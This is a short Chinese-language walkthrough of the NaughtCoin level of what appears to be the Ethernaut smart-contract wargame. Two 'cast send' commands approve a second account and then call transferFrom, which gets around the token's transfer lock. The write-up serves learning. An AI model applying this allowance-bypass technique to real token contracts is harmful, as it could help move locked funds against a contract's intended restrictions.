### 第15关：NaughtCoin 

这一关主要考察 ERC20 的 ABI，该代币的持有者无法直接转账，必须等锁定期过了才能转。但如果把全部额度授权给第三人，则第三人可以把代币全部提走。

1.攻击者把代币授权给第三人
```shell
cast send 0x目标代币地址 "approve(address _spender, uint256 _value)" 0x第三人的地址 代币的数量 --rpc-url=https://blastapi.io --private-key=攻击者的私钥
 ```
2.第三人把代币转移走
```shell
cast send 0x目标代币地址 "transferFrom(address _from, address _to, uint256 _value)" 0x攻击者的地址 0x第三人的地址 代币的数量 --rpc-url=https://blastapi.io --private-key=第三人的私钥
 ```

 点击 Submit Instance, 过关。
